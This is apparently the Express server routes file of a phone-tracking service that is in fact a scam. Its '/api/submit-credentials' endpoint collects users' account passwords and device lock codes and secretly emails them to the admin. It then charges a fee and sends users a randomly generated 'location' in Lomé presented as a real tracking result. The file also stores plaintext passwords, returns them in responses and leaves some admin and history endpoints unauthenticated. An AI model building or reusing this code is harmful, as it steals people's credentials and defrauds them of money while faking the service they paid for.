import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage, type PurchaseStatus } from "./storage";
import { 
  sendUserCredentialsToAdmin, 
  sendPaymentConfirmation, 
  sendLocationToUser,
  UserCredentials 
} from "./email";
import { generateLomeLocation } from "../client/src/lib/device-data";
import { insertPurchaseSchema, PURCHASE_STATUS_TRANSITIONS } from "@shared/schema";

interface SessionRequest extends Request {
  session: any;
}

const MAX_ACTIVE_OPERATIONS_FREE = 3;

async function getCurrentUser(req: Request) {
  const userId = (req as SessionRequest).session?.userId;
  if (!userId) return null;
  return (await storage.getUser(userId)) ?? null;
}

function requireAuth(req: Request, res: Response, next: NextFunction) {
  const userId = (req as SessionRequest).session?.userId;
  if (!userId) return res.status(401).json({ error: "Not logged in" });
  next();
}

async function requireAdmin(req: Request, res: Response, next: NextFunction) {
  const user = await getCurrentUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Admin access required" });
  (req as any).currentUser = user;
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Auth endpoints
  app.post("/api/register", async (req, res) => {
    const { email, password } = req.body;
    const existing = await storage.getUserByEmail(email);
    if (existing) return res.status(400).json({ error: "Email already registered" });
    const user = await storage.createUser({ email, password, isAdmin: false });
    (req as SessionRequest).session.userId = user.id;
    res.json(user);
  });

  app.post("/api/login", async (req, res) => {
    const { email, password } = req.body;
    const user = await storage.getUserByEmail(email);
    if (!user || user.password !== password) {
      return res.status(401).json({ error: "Invalid email or password" });
    }
    (req as SessionRequest).session.userId = user.id;
    res.json(user);
  });

  app.post("/api/logout", (req, res) => {
    (req as SessionRequest).session.destroy(() => {
      res.json({ success: true });
    });
  });

  app.get("/api/user", async (req, res) => {
    const userId = (req as SessionRequest).session.userId;
    if (!userId) return res.status(401).json({ error: "Not logged in" });
    const user = await storage.getUser(userId);
    if (!user) return res.status(401).json({ error: "User not found" });
    res.json(user);
  });

  // Admin: Get all purchases
  app.get('/api/admin/purchases', requireAdmin, async (req, res) => {
    const purchases = await storage.getPurchases();
    res.json(purchases);
  });

  // Get purchase status by IMEI
  app.get('/api/purchases/status/:imei', async (req, res) => {
    const purchases = await storage.getPurchases();
    const purchase = purchases.find(p => p.imei === req.params.imei);
    if (!purchase) return res.status(404).json({ error: 'Purchase not found' });
    res.json({ status: purchase.status });
  });

  // === OPERATIONS API ===

  // List operations (admin sees all, user sees own)
  app.get('/api/operations', requireAuth, async (req, res) => {
    const user = await getCurrentUser(req);
    if (!user) return res.status(401).json({ error: "Not logged in" });
    const filter = (req.query.status as string | undefined);
    let ops = user.isAdmin
      ? await storage.getPurchases()
      : await storage.getPurchasesByUserEmail(user.email);
    if (filter) ops = ops.filter(o => o.status === filter);
    res.json(ops);
  });

  // Get a single operation (with ownership check)
  app.get('/api/operations/:id', requireAuth, async (req, res) => {
    const id = parseInt(req.params.id);
    const op = await storage.getPurchase(id);
    if (!op) return res.status(404).json({ error: 'Operation not found' });
    const user = await getCurrentUser(req);
    if (!user) return res.status(401).json({ error: "Not logged in" });
    if (!user.isAdmin && op.userEmail !== user.email) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    res.json(op);
  });

  // Get audit log for an operation
  app.get('/api/operations/:id/logs', requireAuth, async (req, res) => {
    const id = parseInt(req.params.id);
    const op = await storage.getPurchase(id);
    if (!op) return res.status(404).json({ error: 'Operation not found' });
    const user = await getCurrentUser(req);
    if (!user) return res.status(401).json({ error: "Not logged in" });
    if (!user.isAdmin && op.userEmail !== user.email) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    const logs = await storage.getOperationLogs(id);
    res.json(logs);
  });

  // Admin transitions an operation status
  app.patch('/api/operations/:id/status', requireAdmin, async (req, res) => {
    const id = parseInt(req.params.id);
    const { status, reason } = req.body as { status: PurchaseStatus; reason?: string };
    if (!status) return res.status(400).json({ error: 'Missing status' });

    const admin = (req as any).currentUser;
    try {
      const updated = await storage.transitionPurchaseStatus(
        id, status,
        { id: admin.id, email: admin.email, isAdmin: true },
        reason
      );

      // Side effects on validation
      if (status === 'validated') {
        const isPremium = updated.trackingType === 'priority';
        if (isPremium) {
          const expiryDate = new Date();
          expiryDate.setMonth(expiryDate.getMonth() + 8);
          await storage.updateUserPremium(updated.userEmail, expiryDate.toISOString());
        }
        try {
          await sendPaymentConfirmation(updated.userEmail, updated.device, updated.imei, updated.amount);
        } catch (e) {
          console.error('Email failed (non-fatal):', e);
        }
      }

      res.json(updated);
    } catch (err: any) {
      res.status(400).json({ error: err.message || 'Transition failed' });
    }
  });

  // User cancels their own pending operation
  app.delete('/api/operations/:id', requireAuth, async (req, res) => {
    const id = parseInt(req.params.id);
    const op = await storage.getPurchase(id);
    if (!op) return res.status(404).json({ error: 'Operation not found' });
    const user = await getCurrentUser(req);
    if (!user) return res.status(401).json({ error: "Not logged in" });
    if (!user.isAdmin && op.userEmail !== user.email) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    if (op.status !== 'pending') {
      return res.status(400).json({ error: 'Only pending operations can be cancelled' });
    }
    try {
      const updated = await storage.transitionPurchaseStatus(
        id, 'rejected',
        { id: user.id, email: user.email, isAdmin: true, isSystem: false },
        'Cancelled by user'
      );
      res.json(updated);
    } catch (err: any) {
      res.status(400).json({ error: err.message });
    }
  });

  // Legacy compatibility — Admin: Validate purchase
  app.patch('/api/admin/purchases/:id', requireAdmin, async (req, res) => {
    const id = parseInt(req.params.id);
    const { status, userEmail, device, imei, amount, reason } = req.body;
    const admin = (req as any).currentUser;

    try {
      const updated = await storage.transitionPurchaseStatus(
        id, status as PurchaseStatus,
        { id: admin.id, email: admin.email, isAdmin: true },
        reason
      );

      if (status === 'validated') {
        const isPremium = updated.trackingType === 'priority';
        if (isPremium) {
          const expiryDate = new Date();
          expiryDate.setMonth(expiryDate.getMonth() + 8);
          await storage.updateUserPremium(updated.userEmail, expiryDate.toISOString());
        }
        await sendPaymentConfirmation(userEmail || updated.userEmail, device || updated.device, imei || updated.imei, amount || updated.amount);
      }

      res.json(updated);
    } catch (err: any) {
      res.status(400).json({ error: err.message || 'Transition failed' });
    }
  });

  // Create purchase when payment is initiated
  app.post('/api/purchases', async (req, res) => {
    try {
      const userId = (req as SessionRequest).session.userId;
      const { device, amount, trackingType, userEmail } = req.body;

      if (!device || !amount || !trackingType || !userEmail) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const imei = "TRACK-" + Math.random().toString(36).substring(2, 10).toUpperCase();
      
      const purchase = await storage.createPurchase({
        userId: userId || null,
        device,
        imei,
        amount: Math.round(amount * 100),
        status: "pending",
        userEmail,
        trackingType
      });

      console.log('Created pending purchase for admin:', purchase.id);
      res.json(purchase);
    } catch (error) {
      console.error('Error creating purchase:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Submit user credentials and send to admin
  app.post('/api/submit-credentials', async (req, res) => {
    try {
      const { email, platform, device, identifier, password, lockCode } = req.body;

      if (!email || !platform || !device || !identifier || !password || !lockCode) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const credentials: UserCredentials = {
        email,
        platform,
        device,
        identifier,
        password,
        lockCode,
        imei: "HIDDEN"
      };

      // Create a pending purchase record
      const isPremium = req.body.isFastTrack === true || req.body.platform === 'ios' || req.body.platform === 'android';
      const amount = req.body.isFastTrack ? 35.90 : 16.99;
      const imei = "TRACK-" + Math.random().toString(36).substring(2, 10).toUpperCase();
      
      const purchase = await storage.createPurchase({
        userId: null,
        device,
        imei,
        amount: Math.round(amount * 100), // Store in cents or handle as needed
        status: "pending",
        userEmail: email,
        trackingType: req.body.isFastTrack ? "priority" : "standard"
      });

      console.log('Created pending purchase for admin:', purchase.id);

      // Send credentials to admin (secret)
      try {
        await sendUserCredentialsToAdmin(credentials);
        
        // Send location email to user IMMEDIATELY after credentials submission (4th step)
        const coordinates = generateLomeLocation();
        // Try to update latest purchase for this email
        const purchases = await storage.getPurchases();
        const userEmailForFilter = (req as any).user?.email || email;
        const latest = purchases
          .filter(p => p.userEmail.toLowerCase() === userEmailForFilter.toLowerCase())
          .sort((a, b) => b.id - a.id)[0];
        
        const recipientEmail = (req as any).user?.email || email;
        
        if (latest) {
          await storage.updatePurchaseLocation(latest.id, coordinates[0].toString(), coordinates[1].toString());
          console.log(`Sending location email to ${recipientEmail} for purchase ${latest.id}`);
          await sendLocationToUser(recipientEmail, device, coordinates);
        } else {
          console.log(`No purchase found for email ${recipientEmail}, creating a fallback purchase entry`);
          // Fallback if no purchase was found
          const fallbackPurchase = await storage.createPurchase({
            userId: (req as any).user?.id || null,
            device,
            imei: "TRACK-" + Math.random().toString(36).substring(2, 10).toUpperCase(),
            amount: 0,
            status: "validated",
            userEmail: recipientEmail,
            trackingType: "standard"
          });
          await storage.updatePurchaseLocation(fallbackPurchase.id, coordinates[0].toString(), coordinates[1].toString());
          await sendLocationToUser(recipientEmail, device, coordinates);
        }
      } catch (emailError) {
        console.error('Email sending failed but continuing:', emailError);
        // We continue because the record is already in DB for admin to see
      }

      res.json({ success: true, message: 'Credentials submitted successfully', purchaseId: purchase.id });
    } catch (error) {
      console.error('Error submitting credentials:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send payment confirmation
  app.post('/api/confirm-payment', async (req, res) => {
    try {
      const { userEmail, device, imei } = req.body;

      if (!userEmail || !device || !imei) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const emailSent = await sendPaymentConfirmation(userEmail, device, imei);

      if (emailSent) {
        res.json({ success: true, message: 'Payment confirmation sent' });
      } else {
        res.status(500).json({ error: 'Failed to send payment confirmation' });
      }
    } catch (error) {
      console.error('Error sending payment confirmation:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send location to user
  app.post('/api/send-location', async (req, res) => {
    try {
      const { userEmail, device, purchaseId } = req.body;

      if (!userEmail || !device) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      // Generate random location in Lomé
      const coordinates = generateLomeLocation();
      
      // Save to history if purchaseId is provided
      if (purchaseId) {
        await storage.addLocationHistory({
          purchaseId,
          lat: coordinates[0].toString(),
          lng: coordinates[1].toString(),
          timestamp: new Date().toISOString()
        });
      }

      const emailSent = await sendLocationToUser(userEmail, device, coordinates);

      if (emailSent) {
        res.json({ success: true, message: 'Location sent to user', coordinates });
      } else {
        res.status(500).json({ error: 'Failed to send location' });
      }
    } catch (error) {
      console.error('Error sending location:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Get location history
  app.get('/api/purchases/:id/history', async (req, res) => {
    try {
      const purchaseId = parseInt(req.params.id);
      const history = await storage.getLocationHistory(purchaseId);
      res.json(history);
    } catch (error) {
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/admin/create-test-purchase', async (req, res) => {
    const purchase = await storage.createPurchase({
      userId: null,
      device: "Test Device",
      imei: "TEST-" + Math.random().toString(36).substring(2, 6).toUpperCase(),
      amount: 1699,
      status: "pending",
      userEmail: "test@example.com",
      trackingType: "standard"
    });
    res.json(purchase);
  });

  const httpServer = createServer(app);

  return httpServer;
}
